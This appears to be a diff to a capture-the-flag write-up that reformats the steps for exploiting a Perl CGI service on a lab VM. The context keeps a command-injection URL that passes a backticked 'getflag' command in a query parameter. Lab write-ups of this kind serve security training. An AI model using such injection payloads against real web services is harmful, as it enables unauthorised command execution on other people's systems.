@@ -40,8 +40,11 @@ https://www.perl.com/article/perl-and-cgi/
 ---------------
 
 Steps:
-  - Open a web browser and connect to the VM IP address on port 4747 (for example: http://10.0.2.15:4747/)
-  - Use the query string to pass the getflag command:
+  - Open a web browser and connect to the VM IP address on port 4747
+  ```BASH
+  http://10.0.2.15:4747/
+  ```
+  - Use the query string to pass the getflag command
   ``` bash
   http://192.168.1.67:4747/?x=`getflag`
   ```
